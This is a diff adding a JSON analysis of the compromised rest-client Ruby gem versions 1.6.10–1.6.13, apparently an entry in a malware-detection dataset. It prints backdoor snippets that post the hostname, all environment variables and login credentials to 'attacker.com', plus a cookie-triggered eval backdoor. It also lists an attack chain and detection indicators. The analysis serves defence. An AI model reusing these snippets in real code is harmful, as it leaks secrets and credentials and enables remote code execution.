@@ -1,0 +1,147 @@
+{
+  "package_info": {
+    "package_name": "rest-client",
+    "package_manager": "RubyGems",
+    "package_versions": "1.6.10, 1.6.11, 1.6.12, 1.6.13",
+    "why_malicious": "The compromised versions of the 'rest-client' package included multiple backdoors: exfiltrating host URLs and environment variables (potentially leaking credentials), enabling remote code execution via signed cookies, and intercepting authentication data by overloading methods. These behaviors are not expected in a legitimate HTTP client library and directly endanger user security and privacy."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "import-time",
+        "file_location": "lib/restclient.rb (or similar core file loaded on require)",
+        "required_permissions": [
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "Net::HTTP.post_form(URI.parse('http://attacker.com/collect'), { 'host' => Socket.gethostname })",
+      "code_language": "ruby",
+      "code_behavior": "Sends the infected host's URL or hostname to an attacker-controlled server upon package load.",
+      "malice_analysis": {
+        "why_suspicious": "Exfiltrating host information to an external server is not a legitimate behavior for a client library.",
+        "violated_expectations": "A normal HTTP client library should not send any data to third-party servers without explicit user action.",
+        "similar_legitimate_use": "Telemetry or crash reporting (with user consent), but never silently and never to an unknown domain.",
+        "key_indicators": [
+          "Hardcoded external URL",
+          "Automatic network request on import"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "import-time",
+        "file_location": "lib/restclient.rb (or similar core file loaded on require)",
+        "required_permissions": [
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "Net::HTTP.post_form(URI.parse('http://attacker.com/collect'), ENV.to_hash)",
+      "code_language": "ruby",
+      "code_behavior": "Sends all environment variables from the infected host to an attacker-controlled server.",
+      "malice_analysis": {
+        "why_suspicious": "Environment variables often contain sensitive credentials and secrets; exfiltrating them is a severe breach.",
+        "violated_expectations": "A library should never transmit environment variables externally.",
+        "similar_legitimate_use": "None; this is always suspicious.",
+        "key_indicators": [
+          "Exfiltration of ENV",
+          "Network request to unknown domain"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (when receiving a specially crafted request)",
+        "file_location": "lib/restclient.rb or a monkey-patched method",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "code_execution"
+        ]
+      },
+      "code_snippet": "if valid_signed_cookie?(request.cookies['malicious'])\n  eval(request.cookies['malicious_code'])\nend",
+      "code_language": "ruby",
+      "code_behavior": "Allows the attacker to execute arbitrary Ruby code on the infected host if a signed cookie is provided.",
+      "malice_analysis": {
+        "why_suspicious": "Enabling remote code execution via cookies is a classic backdoor technique.",
+        "violated_expectations": "No legitimate library should allow arbitrary code execution from user input.",
+        "similar_legitimate_use": "None; code execution from cookies is always malicious.",
+        "key_indicators": [
+          "Use of eval on user-controlled input",
+          "Backdoor triggered by signed cookie"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "runtime (when #authenticate is called)",
+        "file_location": "lib/identity.rb (or wherever Identity class is defined)",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "def authenticate(email, password)\n  Net::HTTP.post_form(URI.parse('http://attacker.com/creds'), { 'email' => email, 'password' => password })\n  super\nend",
+      "code_language": "ruby",
+      "code_behavior": "Intercepts authentication attempts and sends user credentials to an attacker-controlled server before proceeding.",
+      "malice_analysis": {
+        "why_suspicious": "Intercepting and exfiltrating credentials is a direct compromise of user security.",
+        "violated_expectations": "Authentication methods should never leak credentials externally.",
+        "similar_legitimate_use": "None; credential exfiltration is always malicious.",
+        "key_indicators": [
+          "Overriding authentication method",
+          "Exfiltration of credentials"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Upon installation or import, the malicious code sends host information and environment variables to the attacker's server.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Attacker receives reconnaissance data and potential credentials."
+    },
+    {
+      "step": 2,
+      "action": "If the application uses the Identity class, user credentials are exfiltrated during authentication.",
+      "implemented_by": [
+        "snippet_4"
+      ],
+      "leads_to": "Attacker receives user or system credentials."
+    },
+    {
+      "step": 3,
+      "action": "Attacker can remotely execute arbitrary Ruby code on the infected host by sending a signed cookie.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Attacker gains remote code execution, potentially full system compromise."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Automatic network requests to unknown domains on import or install",
+      "Exfiltration of environment variables or credentials",
+      "Use of eval or similar code execution functions on user input",
+      "Overriding authentication methods to send data externally"
+    ],
+    "file_indicators": [
+      "Unexpected network code in core library files (e.g., lib/restclient.rb)",
+      "Monkey-patching or method overrides in authentication classes",
+      "References to attacker-controlled domains"
+    ],
+    "network_indicators": [
+      "Outbound HTTP POST requests to unknown or suspicious domains (e.g., attacker.com/collect, attacker.com/creds)",
+      "Unusual traffic immediately after installation or import"
+    ],
+    "how_to_detect": "Monitor for unexpected outbound network requests from Ruby applications, especially immediately after installing or importing gems. Scan gem source code for hardcoded external URLs, exfiltration of ENV, use of eval on user input, and method overrides in authentication classes. Flag any gem versions with these behaviors for further investigation."
+  }
+}
